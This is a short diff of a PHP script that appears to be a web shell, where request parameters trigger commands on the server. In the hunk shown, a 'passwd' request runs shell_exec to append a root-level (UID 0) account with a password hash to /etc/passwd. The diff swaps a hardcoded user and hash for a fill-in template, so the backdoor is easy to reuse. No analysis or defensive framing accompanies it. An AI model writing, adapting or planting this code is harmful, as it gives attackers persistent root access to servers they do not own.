@@ -24,7 +24,7 @@ if (isset($_REQUEST['fexec']))
 
 if (isset($_REQUEST['passwd']))
 {
-    shell_exec("echo 'snork:$1$xfqD9FuY$JU9BUGyF9.5.SrPG27.TP/:0:0::/root:/bin/bash' >> /etc/passwd");
+    shell_exec("echo 'username:< HASH DERIVED FROM:  openssl passwd 'PASSWORD'>:0:0::/root:/bin/bash' >> /etc/passwd");
 };
 
 if (isset($_REQUEST['gtools']))
